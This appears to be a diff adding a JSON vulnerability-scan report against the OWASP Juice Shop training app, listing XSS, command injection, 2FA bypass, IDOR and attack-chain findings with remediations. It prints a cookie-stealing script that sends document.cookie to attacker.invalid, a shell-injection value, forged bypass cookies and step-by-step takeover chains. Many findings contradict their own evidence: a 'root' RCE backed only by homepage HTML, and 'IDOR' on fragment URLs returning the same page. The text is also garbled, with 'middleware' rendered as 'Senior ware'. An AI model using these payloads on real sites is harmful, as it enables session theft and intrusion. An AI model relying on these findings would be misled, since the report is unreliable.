+      "evidence": "https://juiceshop.akto.io/socket.io/?EIO=4&transport=polling&t=Pv51dj0&sid=Qxv5lZodouY2pHzVAAAu\nhttps://juiceshop.akto.io/socket.io/?EIO=4&transport=polling&t=Pv51dmZ&sid=Qxv5lZodouY2pHzVAAAu\nhttps://github.com/juice-shop/juice-shop/hovercards/citation/sidebar_partial?tree_name=master\nhttps://juiceshop.akto.io/socket.io/?EIO=4&transport=polling&t=Pv51dfe\nhttps://github.com/juice-shop/juice-shop/recently-touched-branches\nhttps://juiceshop.akto.io/api/Quantitys/\nhttps://juiceshop.akto.io/rest/admin/application-configuration\nhttps://github.com/juice-shop/juice-shop/contributors_list?current_repository=juice-shop&deferred=true\nhttps://github.com/juice-shop/juice-shop/branch-and-tag-count\nhttps://juiceshop.akto.io/rest/admin/application-version\nhttps://github.com/juice-shop/juice-shop/tree-commit-info\nhttps://juiceshop.akto.io/socket.io/?EIO=4&transport=polling&t=Pv51cPm&sid=W2fob3-6cQ2k5OpcAAAs\nhttps://github.com/juice-shop/juice-shop/sponsors_list?block_button=false&current_repository=juice-shop\nhttps://github.com/juice-shop/juice-shop/used_by_list\nhttps://juiceshop.akto.io/socket.io/?EIO=4&transport=polling&t=Pv51dj2&sid=Qxv5lZodouY2pHzVAAAu\nhttps://github.com/juice-shop/juice-shop/latest-commit\nhttps://github.com/juice-shop/juice-shop/overview-files/master\nhttps://juiceshop.akto.io/socket.io/?EIO=4&transport=polling&t=Pv51cLj&sid=W2fob3-6cQ2k5OpcAAAs\nhttps://github.com/juice-shop/juice-shop/sponsor_button\nhttps://juiceshop.akto.io/rest/languages",
+      "owasp": "A05:2021 \u2013 Security Misconfiguration",
+      "remediation": "Review all API calls for missing authentication."
+    },
+    {
+      "url": "https://juiceshop.akto.io/#/api/coupon/apply",
+      "type": "Business Logic \u2014 Race Condition (Double Spend / Duplicate Redemption)",
+      "severity": "high",
+      "cvss": 8.1,
+      "detail": "15/15 concurrent requests to /api/coupon/apply succeeded. Race condition may allow double-spending, duplicate coupon use, or balance manipulation.",
+      "evidence": "HTTP 200/201 responses: 15/15 concurrent requests",
+      "owasp": "A04:2021 \u2013 Insecure Design",
+      "remediation": "Use database-level locking (SELECT FOR UPDATE). Implement idempotency keys. Use optimistic concurrency with version fields."
+    },
+    {
+      "url": "https://juiceshop.akto.io/#/api/withdraw",
+      "type": "Business Logic \u2014 Race Condition (Double Spend / Duplicate Redemption)",
+      "severity": "high",
+      "cvss": 8.1,
+      "detail": "15/15 concurrent requests to /api/withdraw succeeded. Race condition may allow double-spending, duplicate coupon use, or balance manipulation.",
+      "evidence": "HTTP 200/201 responses: 15/15 concurrent requests",
+      "owasp": "A04:2021 \u2013 Insecure Design",
+      "remediation": "Use database-level locking (SELECT FOR UPDATE). Implement idempotency keys. Use optimistic concurrency with version fields."
+    },
+    {
+      "url": "https://juiceshop.akto.io/#/api/transfer",
+      "type": "Business Logic \u2014 Race Condition (Double Spend / Duplicate Redemption)",
+      "severity": "high",
+      "cvss": 8.1,
+      "detail": "15/15 concurrent requests to /api/transfer succeeded. Race condition may allow double-spending, duplicate coupon use, or balance manipulation.",
+      "evidence": "HTTP 200/201 responses: 15/15 concurrent requests",
+      "owasp": "A04:2021 \u2013 Insecure Design",
+      "remediation": "Use database-level locking (SELECT FOR UPDATE). Implement idempotency keys. Use optimistic concurrency with version fields."
+    },
+    {
+      "url": "https://juiceshop.akto.io/#/api/redeem",
+      "type": "Business Logic \u2014 Race Condition (Double Spend / Duplicate Redemption)",
+      "severity": "high",
+      "cvss": 8.1,
+      "detail": "15/15 concurrent requests to /api/redeem succeeded. Race condition may allow double-spending, duplicate coupon use, or balance manipulation.",
+      "evidence": "HTTP 200/201 responses: 15/15 concurrent requests",
+      "owasp": "A04:2021 \u2013 Insecure Design",
+      "remediation": "Use database-level locking (SELECT FOR UPDATE). Implement idempotency keys. Use optimistic concurrency with version fields."
+    },
+    {
+      "url": "https://juiceshop.akto.io/#",
+      "type": "XSS \u2014 Session Hijack Payload (Generated)",
+      "severity": "critical",
+      "cvss": 9.3,
+      "parameter": "q",
+      "detail": "XSS confirmed in 'q'. Cookie-stealing payload generated. Attacker can capture session tokens of authenticated users.",
+      "evidence": "Payload: <script>fetch('https://attacker.invalid/steal?c='+document.cookie);</script>",
+      "owasp": "A03:2021 \u2013 Injection",
+      "remediation": "Implement strict CSP. Sanitize all output. Set HttpOnly + Secure flags on all session cookies.",
+      "exploit_chain": "XSS \u2192 Cookie Theft \u2192 Session Hijack \u2192 Account Takeover"
+    },
+    {
+      "url": "https://juiceshop.akto.io/#",
+      "type": "RCE \u2014 Remote Code Execution (Exploited)",
+      "severity": "critical",
+      "cvss": 10.0,
+      "parameter": "cmd",
+      "payload": "valid_input;id; whoami",
+      "detail": "Command 'id; whoami' executed. Output detected: 'root'",
+      "evidence": "<!--\n  ~ Copyright (c) 2014-2026 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  -->\n\n<!doctype html>\n<html lang=\"en\" data-beasties-container>\n<head>\n  <meta charset=\"utf-8\">\n  <title>OWASP Juice Shop</title>\n  <meta name=\"description\" content=\"Probably the most modern and sophisticated insecure web application\">\n  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n  <link id=\"favicon\" rel=\"icon\" type=\"image/x-icon\" href=\"assets/public/f",
+      "owasp": "A03:2021 \u2013 Injection",
+      "remediation": "CRITICAL: Sanitize all shell inputs. Use subprocess with argument lists. Restrict OS command access from web layer.",
+      "exploit_chain": "RCE \u2192 Shell \u2192 Data Exfiltration / Lateral Movement"
+    },
+    {
+      "url": "https://juiceshop.akto.io/#",
+      "type": "RCE \u2014 Remote Code Execution (Exploited)",
+      "severity": "critical",
+      "cvss": 10.0,
+      "parameter": "cmd",
+      "payload": "valid_input;id; whoami",
+      "detail": "Command 'id; whoami' executed. Output detected: 'root'",
+      "evidence": "<!--\n  ~ Copyright (c) 2014-2026 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  -->\n\n<!doctype html>\n<html lang=\"en\" data-beasties-container>\n<head>\n  <meta charset=\"utf-8\">\n  <title>OWASP Juice Shop</title>\n  <meta name=\"description\" content=\"Probably the most modern and sophisticated insecure web application\">\n  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n  <link id=\"favicon\" rel=\"icon\" type=\"image/x-icon\" href=\"assets/public/f",
+      "owasp": "A03:2021 \u2013 Injection",
+      "remediation": "CRITICAL: Sanitize all shell inputs. Use subprocess with argument lists. Restrict OS command access from web layer.",
+      "exploit_chain": "RCE \u2192 Shell \u2192 Data Exfiltration / Lateral Movement"
+    },
+    {
+      "url": "https://juiceshop.akto.io/#",
+      "type": "XSS \u2014 Session Hijack Payload (Generated)",
+      "severity": "critical",
+      "cvss": 9.3,
+      "parameter": "q",
+      "detail": "XSS confirmed in 'q'. Cookie-stealing payload generated. Attacker can capture session tokens of authenticated users.",
+      "evidence": "Payload: <script>fetch('https://attacker.invalid/steal?c='+document.cookie);</script>",
+      "owasp": "A03:2021 \u2013 Injection",
+      "remediation": "Implement strict CSP. Sanitize all output. Set HttpOnly + Secure flags on all session cookies.",
+      "exploit_chain": "XSS \u2192 Cookie Theft \u2192 Session Hijack \u2192 Account Takeover"
+    },
+    {
+      "url": "https://juiceshop.akto.io/#",
+      "type": "XSS \u2014 Session Hijack Payload (Generated)",
+      "severity": "critical",
+      "cvss": 9.3,
+      "parameter": "q",
+      "detail": "XSS confirmed in 'q'. Cookie-stealing payload generated. Attacker can capture session tokens of authenticated users.",
+      "evidence": "Payload: <script>fetch('https://attacker.invalid/steal?c='+document.cookie);</script>",
+      "owasp": "A03:2021 \u2013 Injection",
+      "remediation": "Implement strict CSP. Sanitize all output. Set HttpOnly + Secure flags on all session cookies.",
+      "exploit_chain": "XSS \u2192 Cookie Theft \u2192 Session Hijack \u2192 Account Takeover"
+    },
+    {
+      "url": "https://juiceshop.akto.io/#",
+      "type": "RCE \u2014 Remote Code Execution (Exploited)",
+      "severity": "critical",
+      "cvss": 10.0,
+      "parameter": "cmd",
+      "payload": "valid_input;id; whoami",
+      "detail": "Command 'id; whoami' executed. Output detected: 'root'",
+      "evidence": "<!--\n  ~ Copyright (c) 2014-2026 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  -->\n\n<!doctype html>\n<html lang=\"en\" data-beasties-container>\n<head>\n  <meta charset=\"utf-8\">\n  <title>OWASP Juice Shop</title>\n  <meta name=\"description\" content=\"Probably the most modern and sophisticated insecure web application\">\n  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n  <link id=\"favicon\" rel=\"icon\" type=\"image/x-icon\" href=\"assets/public/f",
+      "owasp": "A03:2021 \u2013 Injection",
+      "remediation": "CRITICAL: Sanitize all shell inputs. Use subprocess with argument lists. Restrict OS command access from web layer.",
+      "exploit_chain": "RCE \u2192 Shell \u2192 Data Exfiltration / Lateral Movement"
+    },
+    {
+      "url": "https://juiceshop.akto.io/#/",
+      "type": "XSS \u2014 Session Hijack Payload (Generated)",
+      "severity": "critical",
+      "cvss": 9.3,
+      "parameter": "q",
+      "detail": "XSS confirmed in 'q'. Cookie-stealing payload generated. Attacker can capture session tokens of authenticated users.",
+      "evidence": "Payload: <script>fetch('https://attacker.invalid/steal?c='+document.cookie);</script>",
+      "owasp": "A03:2021 \u2013 Injection",
+      "remediation": "Implement strict CSP. Sanitize all output. Set HttpOnly + Secure flags on all session cookies.",
+      "exploit_chain": "XSS \u2192 Cookie Theft \u2192 Session Hijack \u2192 Account Takeover"
+    },
+    {
+      "url": "https://juiceshop.akto.io/#/",
+      "type": "XSS \u2014 Session Hijack Payload (Generated)",
+      "severity": "critical",
+      "cvss": 9.3,
+      "parameter": "q",
+      "detail": "XSS confirmed in 'q'. Cookie-stealing payload generated. Attacker can capture session tokens of authenticated users.",
+      "evidence": "Payload: <script>fetch('https://attacker.invalid/steal?c='+document.cookie);</script>",
+      "owasp": "A03:2021 \u2013 Injection",
+      "remediation": "Implement strict CSP. Sanitize all output. Set HttpOnly + Secure flags on all session cookies.",
+      "exploit_chain": "XSS \u2192 Cookie Theft \u2192 Session Hijack \u2192 Account Takeover"
+    },
+    {
+      "url": "https://juiceshop.akto.io/",
+      "type": "XSS \u2014 Session Hijack Payload (Generated)",
+      "severity": "critical",
+      "cvss": 9.3,
+      "parameter": "q",
+      "detail": "XSS confirmed in 'q'. Cookie-stealing payload generated. Attacker can capture session tokens of authenticated users.",
+      "evidence": "Payload: <script>fetch('https://attacker.invalid/steal?c='+document.cookie);</script>",
+      "owasp": "A03:2021 \u2013 Injection",
+      "remediation": "Implement strict CSP. Sanitize all output. Set HttpOnly + Secure flags on all session cookies.",
+      "exploit_chain": "XSS \u2192 Cookie Theft \u2192 Session Hijack \u2192 Account Takeover"
+    },
+    {
+      "url": "https://juiceshop.akto.io/",
+      "type": "XSS \u2014 Session Hijack Payload (Generated)",
+      "severity": "critical",
+      "cvss": 9.3,
+      "parameter": "q",
+      "detail": "XSS confirmed in 'q'. Cookie-stealing payload generated. Attacker can capture session tokens of authenticated users.",
+      "evidence": "Payload: <script>fetch('https://attacker.invalid/steal?c='+document.cookie);</script>",
+      "owasp": "A03:2021 \u2013 Injection",
+      "remediation": "Implement strict CSP. Sanitize all output. Set HttpOnly + Secure flags on all session cookies.",
+      "exploit_chain": "XSS \u2192 Cookie Theft \u2192 Session Hijack \u2192 Account Takeover"
+    },
+    {
+      "url": "https://juiceshop.akto.io/#",
+      "type": "2FA \u2014 Not Implemented",
+      "severity": "medium",
+      "cvss": 5.9,
+      "detail": "No 2FA/MFA endpoint detected.",
+      "evidence": "None of common OTP paths returned OTP form.",
+      "owasp": "A07:2021 \u2013 Identification and Authentication Failures",
+      "remediation": "Implement TOTP-based 2FA (FIDO2/WebAuthn/RFC 6238) for all accounts."
+    },
+    {
+      "url": null,
+      "type": "2FA \u2014 No Rate Limiting on OTP (Brute-force Possible)",
+      "severity": "high",
+      "cvss": 7.5,
+      "detail": "Tested 7 OTP codes with no lockout or 429 response.",
+      "evidence": "No rate-limit after 7 attempts",
+      "owasp": "A07:2021 \u2013 Identification and Authentication Failures",
+      "remediation": "Enforce max 5 attempts. Add exponential backoff and account lockout."
+    },
+    {
+      "url": "https://juiceshop.akto.io/#/dashboard",
+      "type": "2FA \u2014 Step Skip (Direct URL Access)",
+      "severity": "critical",
+      "cvss": 9.1,
+      "detail": "Protected page '/dashboard' accessible without 2FA completion.",
+      "evidence": "HTTP 200 on /dashboard without 2FA session",
+      "owasp": "A01:2021 \u2013 Broken Access Control",
+      "remediation": "Enforce 2FA completion check on ALL protected routes via Senior ware."
+    },
+    {
+      "url": "https://juiceshop.akto.io/#/dashboard",
+      "type": "2FA \u2014 Cookie Bypass ('mfa_verified=true')",
+      "severity": "critical",
+      "cvss": 9.8,
+      "detail": "Setting cookie mfa_verified=true bypasses 2FA entirely.",
+      "evidence": "Cookie: mfa_verified=true \u2192 access granted to /dashboard",
+      "owasp": "A07:2021 \u2013 Identification and Authentication Failures",
+      "remediation": "Store 2FA state server-side in session, not in cookies."
+    },
+    {
+      "url": "https://juiceshop.akto.io/#/dashboard",
+      "type": "2FA \u2014 Remember-Me Cookie Forgery ('remember_me')",
+      "severity": "high",
+      "cvss": 7.5,
+      "detail": "Forged 'remember_me=1' cookie bypasses 2FA for trusted device.",
+      "evidence": "Cookie: remember_me=1",
+      "owasp": "A07:2021 \u2013 Identification and Authentication Failures",
+      "remediation": "Bind trusted device tokens to user+device fingerprint server-side. Sign tokens."
+    },
+    {
+      "url": "https://juiceshop.akto.io/#/auth/google",
+      "type": "2FA \u2014 OAuth/SSO May Bypass 2FA",
+      "severity": "high",
+      "cvss": 7.8,
+      "detail": "OAuth/SSO endpoint at '/auth/google' may log users in without 2FA. Social login commonly bypasses MFA if not explicitly enforced.",
+      "evidence": "OAuth endpoint: /auth/google \u2192 HTTP 200",
+      "owasp": "A07:2021 \u2013 Identification and Authentication Failures",
+      "remediation": "Enforce 2FA for OAuth-authenticated users. Check MFA status post-OAuth login."
+    },
+    {
+      "type": "CHAIN: XSS \u2192 CSRF \u2192 Account Takeover",
+      "severity": "critical",
+      "cvss": 9.8,
+      "url": "https://juiceshop.akto.io/#",
+      "module": "Chain Engine",
+      "detail": "XSS allows attacker to steal CSRF tokens from victim's browser DOM, then forge authenticated state-changing requests (password reset, email change) without victim's knowledge \u2014 leading to full account takeover.",
+      "evidence": "Step 1: [Missing Header: Content-Security-Policy] at https://juiceshop.akto.io/#\nStep 2: [Cookie Missing SameSite: ApplicationGatewayAffinity] at https://juiceshop.akto.io/#",
+      "owasp": "A01:2021 \u2013 Broken Access Control (Chained)",
+      "remediation": "Implement strict CSP (Content-Security-Policy). Use SameSite=Strict cookies. Enforce CSRF tokens even when XSS is patched (defense in depth).",
+      "attack_steps": "XSS \u2192 Steal CSRF Token \u2192 Forge Request \u2192 Change Email/Password \u2192 Account Takeover",
+      "chain_components": [
+        "Missing Header: Content-Security-Policy",
+        "Cookie Missing SameSite: ApplicationGatewayAffinity"
+      ]
+    },
+    {
+      "type": "CHAIN: CORS Misconfiguration \u2192 XSS \u2192 Session Theft",
+      "severity": "high",
+      "cvss": 8.8,
+      "url": "https://juiceshop.akto.io/#",
+      "module": "Chain Engine",
+      "detail": "Permissive CORS allows malicious origins to make authenticated API requests. Combined with XSS, attacker can send victim's session cookies to a controlled server via cross-origin fetch.",
+      "evidence": "Step 1: [CORS Wildcard Origin] at https://juiceshop.akto.io/#\nStep 2: [Missing Header: Content-Security-Policy] at https://juiceshop.akto.io/#",
+      "owasp": "A01:2021 \u2013 Broken Access Control (Chained)",
+      "remediation": "Restrict CORS to trusted origins. Do not use wildcard (*) with credentials. Set HttpOnly + Secure + SameSite on cookies.",
+      "attack_steps": "CORS * \u2192 XSS on trusted subdomain \u2192 fetch(attacker.com, cookies) \u2192 Session Steal",
+      "chain_components": [
+        "CORS Wildcard Origin",
+        "Missing Header: Content-Security-Policy"
+      ]
+    },
+    {
+      "type": "CHAIN: IDOR \u2192 PII Exfiltration \u2192 Mass Account Hijack",
+      "severity": "critical",
+      "cvss": 9.1,
+      "url": "https://juiceshop.akto.io/#/admin",
+      "module": "Chain Engine",
+      "detail": "Insecure Direct Object References allow attackers to enumerate user IDs and access other users' data (emails, addresses, payment info). At scale, this enables mass PII exfiltration and account takeover.",
+      "evidence": "Step 1: [Unauthenticated Admin Access] at https://juiceshop.akto.io/#/admin\nStep 2: [Secret Leakage in JS \u2014 Password] at https://juiceshop.akto.io/main.js",
+      "owasp": "A01:2021 \u2013 Broken Access Control (Chained)",
+      "remediation": "Implement authorization checks on every resource access. Use UUID instead of sequential IDs. Log and alert on anomalous data access patterns.",
+      "attack_steps": "IDOR /api/user/1 \u2192 iterate IDs \u2192 dump all emails \u2192 credential stuffing \u2192 mass takeover",
+      "chain_components": [
+        "Unauthenticated Admin Access",
+        "Secret Leakage in JS \u2014 Password"
+      ]
+    },
+    {
+      "type": "CHAIN: JWT None Algorithm \u2192 Admin Privilege Escalation",
+      "severity": "critical",
+      "cvss": 9.8,
+      "url": "https://juiceshop.akto.io/#",
+      "module": "Chain Engine",
+      "detail": "JWT with 'alg:none' or weak HS256 secret allows forging tokens with arbitrary claims (e.g. role:admin). This bypasses all role-based access controls.",
+      "evidence": "Step 1: [XSS \u2014 Session Hijack Payload (Generated)] at https://juiceshop.akto.io/#\nStep 2: [Unauthenticated Admin Access] at https://juiceshop.akto.io/#/admin",
+      "owasp": "A01:2021 \u2013 Broken Access Control (Chained)",
+      "remediation": "Enforce RS256/ES256 algorithms. Reject 'none' algorithm. Validate all JWT claims server-side. Use short expiration times.",
+      "attack_steps": "JWT alg:none \u2192 Forge {role:admin} \u2192 Access admin panel \u2192 Full privilege escalation",
+      "chain_components": [
+        "XSS \u2014 Session Hijack Payload (Generated)",
+        "Unauthenticated Admin Access"
+      ]
+    },
+    {
+      "url": "https://juiceshop.akto.io/#/api/user/1",
+      "type": "IDOR \u2014 Confirmed: Unauthenticated Access to Private Resource",
+      "severity": "critical",
+      "cvss": 9.1,
+      "detail": "'/api/user/1' returns identical content to both authenticated and unauthenticated sessions. PII fields: []",
+      "evidence": "Auth hash == Anon hash (74b9c72be0ef880e9d8e2713d3be4b51). Preview: <!--\n  ~ Copyright (c) 2014-2026 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  -->\n\n<!doctype html>\n<html l",
+      "owasp": "A01:2021 \u2013 Broken Access Control",
+      "remediation": "Implement authorization Senior ware on every endpoint. Verify that the requesting user owns the requested object. Return 401/403 for unauthenticated access."
+    },
+    {
+      "url": "https://juiceshop.akto.io/#/api/users/1",
+      "type": "IDOR \u2014 Confirmed: Unauthenticated Access to Private Resource",
+      "severity": "critical",
+      "cvss": 9.1,
+      "detail": "'/api/users/1' returns identical content to both authenticated and unauthenticated sessions. PII fields: []",
+      "evidence": "Auth hash == Anon hash (74b9c72be0ef880e9d8e2713d3be4b51). Preview: <!--\n  ~ Copyright (c) 2014-2026 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  -->\n\n<!doctype html>\n<html l",
+      "owasp": "A01:2021 \u2013 Broken Access Control",
+      "remediation": "Implement authorization Senior ware on every endpoint. Verify that the requesting user owns the requested object. Return 401/403 for unauthenticated access."
+    },
+    {
+      "url": "https://juiceshop.akto.io/#/api/account/1",
+      "type": "IDOR \u2014 Confirmed: Unauthenticated Access to Private Resource",
+      "severity": "critical",
+      "cvss": 9.1,
+      "detail": "'/api/account/1' returns identical content to both authenticated and unauthenticated sessions. PII fields: []",
+      "evidence": "Auth hash == Anon hash (74b9c72be0ef880e9d8e2713d3be4b51). Preview: <!--\n  ~ Copyright (c) 2014-2026 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  -->\n\n<!doctype html>\n<html l",
+      "owasp": "A01:2021 \u2013 Broken Access Control",
+      "remediation": "Implement authorization Senior ware on every endpoint. Verify that the requesting user owns the requested object. Return 401/403 for unauthenticated access."
+    },
+    {
+      "url": "https://juiceshop.akto.io/#/api/profile/1",
+      "type": "IDOR \u2014 Confirmed: Unauthenticated Access to Private Resource",
+      "severity": "critical",
+      "cvss": 9.1,
+      "detail": "'/api/profile/1' returns identical content to both authenticated and unauthenticated sessions. PII fields: []",
+      "evidence": "Auth hash == Anon hash (74b9c72be0ef880e9d8e2713d3be4b51). Preview: <!--\n  ~ Copyright (c) 2014-2026 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  -->\n\n<!doctype html>\n<html l",
+      "owasp": "A01:2021 \u2013 Broken Access Control",
+      "remediation": "Implement authorization Senior ware on every endpoint. Verify that the requesting user owns the requested object. Return 401/403 for unauthenticated access."
+    },
+    {
+      "url": "https://juiceshop.akto.io/#/api/order/1",
+      "type": "IDOR \u2014 Confirmed: Unauthenticated Access to Private Resource",
+      "severity": "critical",
+      "cvss": 9.1,
+      "detail": "'/api/order/1' returns identical content to both authenticated and unauthenticated sessions. PII fields: []",
+      "evidence": "Auth hash == Anon hash (74b9c72be0ef880e9d8e2713d3be4b51). Preview: <!--\n  ~ Copyright (c) 2014-2026 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  -->\n\n<!doctype html>\n<html l",
+      "owasp": "A01:2021 \u2013 Broken Access Control",
+      "remediation": "Implement authorization Senior ware on every endpoint. Verify that the requesting user owns the requested object. Return 401/403 for unauthenticated access."
+    },
+    {
+      "url": "https://juiceshop.akto.io/#/api/invoice/1",
+      "type": "IDOR \u2014 Confirmed: Unauthenticated Access to Private Resource",
+      "severity": "critical",
+      "cvss": 9.1,
+      "detail": "'/api/invoice/1' returns identical content to both authenticated and unauthenticated sessions. PII fields: []",
+      "evidence": "Auth hash == Anon hash (74b9c72be0ef880e9d8e2713d3be4b51). Preview: <!--\n  ~ Copyright (c) 2014-2026 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  -->\n\n<!doctype html>\n<html l",
+      "owasp": "A01:2021 \u2013 Broken Access Control",
+      "remediation": "Implement authorization Senior ware on every endpoint. Verify that the requesting user owns the requested object. Return 401/403 for unauthenticated access."
+    },
+    {
+      "url": "https://juiceshop.akto.io/#/api/payment/1",
+      "type": "IDOR \u2014 Confirmed: Unauthenticated Access to Private Resource",
+      "severity": "critical",
+      "cvss": 9.1,
+      "detail": "'/api/payment/1' returns identical content to both authenticated and unauthenticated sessions. PII fields: []",
+      "evidence": "Auth hash == Anon hash (74b9c72be0ef880e9d8e2713d3be4b51). Preview: <!--\n  ~ Copyright (c) 2014-2026 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  -->\n\n<!doctype html>\n<html l",
+      "owasp": "A01:2021 \u2013 Broken Access Control",
+      "remediation": "Implement authorization Senior ware on every endpoint. Verify that the requesting user owns the requested object. Return 401/403 for unauthenticated access."
+    },
+    {
+      "url": "https://juiceshop.akto.io/#/api/document/1",
+      "type": "IDOR \u2014 Confirmed: Unauthenticated Access to Private Resource",
+      "severity": "critical",
+      "cvss": 9.1,
+      "detail": "'/api/document/1' returns identical content to both authenticated and unauthenticated sessions. PII fields: []",
+      "evidence": "Auth hash == Anon hash (74b9c72be0ef880e9d8e2713d3be4b51). Preview: <!--\n  ~ Copyright (c) 2014-2026 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  -->\n\n<!doctype html>\n<html l",
+      "owasp": "A01:2021 \u2013 Broken Access Control",
+      "remediation": "Implement authorization Senior ware on every endpoint. Verify that the requesting user owns the requested object. Return 401/403 for unauthenticated access."
+    },
+    {
+      "url": "https://juiceshop.akto.io/#/api/file/1",
+      "type": "IDOR \u2014 Confirmed: Unauthenticated Access to Private Resource",
+      "severity": "critical",
+      "cvss": 9.1,
+      "detail": "'/api/file/1' returns identical content to both authenticated and unauthenticated sessions. PII fields: []",
+      "evidence": "Auth hash == Anon hash (74b9c72be0ef880e9d8e2713d3be4b51). Preview: <!--\n  ~ Copyright (c) 2014-2026 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  -->\n\n<!doctype html>\n<html l",
+      "owasp": "A01:2021 \u2013 Broken Access Control",
+      "remediation": "Implement authorization Senior ware on every endpoint. Verify that the requesting user owns the requested object. Return 401/403 for unauthenticated access."
+    },
+    {
+      "url": "https://juiceshop.akto.io/#/api/ticket/1",
+      "type": "IDOR \u2014 Confirmed: Unauthenticated Access to Private Resource",
+      "severity": "critical",
+      "cvss": 9.1,
+      "detail": "'/api/ticket/1' returns identical content to both authenticated and unauthenticated sessions. PII fields: []",
+      "evidence": "Auth hash == Anon hash (74b9c72be0ef880e9d8e2713d3be4b51). Preview: <!--\n  ~ Copyright (c) 2014-2026 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  -->\n\n<!doctype html>\n<html l",
+      "owasp": "A01:2021 \u2013 Broken Access Control",
+      "remediation": "Implement authorization Senior ware on every endpoint. Verify that the requesting user owns the requested object. Return 401/403 for unauthenticated access."
+    },
+    {
+      "url": "https://juiceshop.akto.io/#/api/user/1",
+      "type": "IDOR \u2014 Unauthorized DELETE",
+      "severity": "critical",
+      "cvss": 9.1,
+      "detail": "HTTP DELETE on /api/user/1 succeeded without authorization.",
+      "evidence": "HTTP 200",
+      "owasp": "A01:2021 \u2013 Broken Access Control",
+      "remediation": "Enforce authorization on all HTTP methods."
+    },
+    {
+      "url": "https://juiceshop.akto.io/#/api/user/1",
+      "type": "IDOR \u2014 Unauthorized PUT",
+      "severity": "critical",
+      "cvss": 9.1,
+      "detail": "HTTP PUT on /api/user/1 succeeded without authorization.",
+      "evidence": "HTTP 200",
+      "owasp": "A01:2021 \u2013 Broken Access Control",
+      "remediation": "Enforce authorization on all HTTP methods."
+    },
+    {
+      "url": "https://juiceshop.akto.io/#/api/user/1",
+      "type": "IDOR \u2014 Unauthorized PATCH",
+      "severity": "critical",
+      "cvss": 9.1,
+      "detail": "HTTP PATCH on /api/user/1 succeeded without authorization.",
+      "evidence": "HTTP 200",
+      "owasp": "A01:2021 \u2013 Broken Access Control",
+      "remediation": "Enforce authorization on all HTTP methods."
+    },
+    {
+      "url": "https://juiceshop.akto.io/#/api/account/1",
+      "type": "IDOR \u2014 Unauthorized DELETE",
+      "severity": "critical",
+      "cvss": 9.1,
+      "detail": "HTTP DELETE on /api/account/1 succeeded without authorization.",
+      "evidence": "HTTP 200",
+      "owasp": "A01:2021 \u2013 Broken Access Control",
+      "remediation": "Enforce authorization on all HTTP methods."
+    },
+    {
+      "url": "https://juiceshop.akto.io/#/api/account/1",
+      "type": "IDOR \u2014 Unauthorized PUT",
+      "severity": "critical",
+      "cvss": 9.1,
+      "detail": "HTTP PUT on /api/account/1 succeeded without authorization.",
+      "evidence": "HTTP 200",
+      "owasp": "A01:2021 \u2013 Broken Access Control",
+      "remediation": "Enforce authorization on all HTTP methods."
+    },
+    {
+      "url": "https://juiceshop.akto.io/#/api/account/1",
+      "type": "IDOR \u2014 Unauthorized PATCH",
+      "severity": "critical",
+      "cvss": 9.1,
+      "detail": "HTTP PATCH on /api/account/1 succeeded without authorization.",
+      "evidence": "HTTP 200",
+      "owasp": "A01:2021 \u2013 Broken Access Control",
+      "remediation": "Enforce authorization on all HTTP methods."
+    },
+    {
+      "url": "https://juiceshop.akto.io/#/api/order/1",
+      "type": "IDOR \u2014 Unauthorized DELETE",
+      "severity": "critical",
+      "cvss": 9.1,
+      "detail": "HTTP DELETE on /api/order/1 succeeded without authorization.",
+      "evidence": "HTTP 200",
+      "owasp": "A01:2021 \u2013 Broken Access Control",
+      "remediation": "Enforce authorization on all HTTP methods."
+    },
+    {
+      "url": "https://juiceshop.akto.io/#/api/order/1",
+      "type": "IDOR \u2014 Unauthorized PUT",
+      "severity": "critical",
+      "cvss": 9.1,
+      "detail": "HTTP PUT on /api/order/1 succeeded without authorization.",
+      "evidence": "HTTP 200",
+      "owasp": "A01:2021 \u2013 Broken Access Control",
+      "remediation": "Enforce authorization on all HTTP methods."
+    },
+    {
+      "url": "https://juiceshop.akto.io/#/api/order/1",
+      "type": "IDOR \u2014 Unauthorized PATCH",
+      "severity": "critical",
+      "cvss": 9.1,
+      "detail": "HTTP PATCH on /api/order/1 succeeded without authorization.",
+      "evidence": "HTTP 200",
+      "owasp": "A01:2021 \u2013 Broken Access Control",
+      "remediation": "Enforce authorization on all HTTP methods."
+    },
+    {
+      "url": "https://juiceshop.akto.io/#/profile/fake.css",
+      "type": "Web Cache Deception \u2014 Sensitive Path Cacheable",
+      "severity": "high",
+      "cvss": 7.5,
+      "payload": "https://juiceshop.akto.io/#/profile/fake.css",
+      "detail": "Authenticated path '/profile' is accessible as '/fake.css' and may be cached. An attacker can trick authenticated users to visit this URL, caching their private data for unauthenticated retrieval.",
+      "evidence": "Cache-Control: public, max-age=0 | X-Cache:  | Status: 200",
+      "owasp": "A01:2021 \u2013 Broken Access Control",
+      "remediation": "Set Cache-Control: no-store on all authenticated responses. Configure CDN to not cache URLs matching authenticated paths. Validate request path ends with expected extension."
+    },
+    {
+      "url": "https://juiceshop.akto.io/#/account/fake.css",
+      "type": "Web Cache Deception \u2014 Sensitive Path Cacheable",
+      "severity": "high",
+      "cvss": 7.5,
+      "payload": "https://juiceshop.akto.io/#/account/fake.css",
